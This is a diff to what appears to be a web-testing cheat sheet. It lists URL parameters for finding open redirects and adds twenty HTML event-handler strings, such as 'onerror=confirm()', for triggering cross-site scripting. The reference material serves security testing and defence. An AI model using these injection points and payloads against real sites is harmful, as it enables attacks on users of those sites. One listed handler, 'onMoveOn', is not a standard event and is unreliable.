@@ -155,7 +155,7 @@
 - `?start={payload}`
 - `?stop={payload}`
 
-## Open Redirect Dorks (For @lutfumertceylan)
+## Open Redirect Dorks 
 
 - `/{payload}`
 - `?next={payload}`
@@ -186,4 +186,25 @@
 - `?continue_url={payload}`
 
 ---
+## Top 20 Event Handlers to Trigger XSS
 
+- `onload=alert()`
+- `onerror=confirm()`
+- `onfocus=prompt()`
+- `onclick=alert()`
+- `onmouseover=confirm()`
+- `onchange=prompt()`
+- `onmouseup=alert()`
+- `onkeydown=confirm()`
+- `onkeyup=prompt()`
+- `onkeypress=alert()`
+- `onMoveOn=confirm()`
+- `onabort=prompt()`
+- `ondblclick=alert()`
+- `onresize=confirm()`
+- `onselect=prompt()`
+- `onscroll=alert()`
+- `onsubmit=confirm()`
+- `onblur=prompt()`
+- `onreset=alert()`
+- `onunload=confirm()
